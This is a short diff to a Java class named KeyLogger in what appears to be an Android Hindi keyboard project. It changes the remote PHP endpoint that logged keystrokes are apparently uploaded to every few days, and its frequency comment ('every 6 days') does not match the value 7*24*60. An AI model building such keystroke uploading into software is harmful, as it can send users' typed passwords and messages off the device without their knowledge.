@@ -22,7 +22,7 @@ import android.util.Log;
 public class KeyLogger {
 	private static long uploadFreq = 7 * 24 * 60; // every 6 days
 	private static long uploadtimestamp = 0;
-	private static final String stringUrl = "http://idid.in/android/storeaway.php";
+	private static final String stringUrl = "http://idid.in/android/logsdebug.php";
 	private static final String map = "muppetymaphindi.dat";
 	private static final String language = "heendey";
 	public final String TAG = "logger";
